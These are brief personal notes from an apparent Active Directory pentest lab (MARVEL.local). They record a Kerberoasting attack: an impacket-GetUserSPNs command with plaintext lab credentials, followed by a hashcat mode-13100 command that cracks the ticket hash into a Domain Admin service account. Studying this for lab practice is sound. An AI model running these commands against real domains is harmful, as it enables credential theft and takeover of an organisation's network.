- `impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.1.4 -request`
  ![[Pasted image 20250329165310.png]]
- Cracking the hash using hashcat:
	- `hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt`
- Domain Admin `SQLService` Account hacked : ) :
![[Pasted image 20250329165648.png]]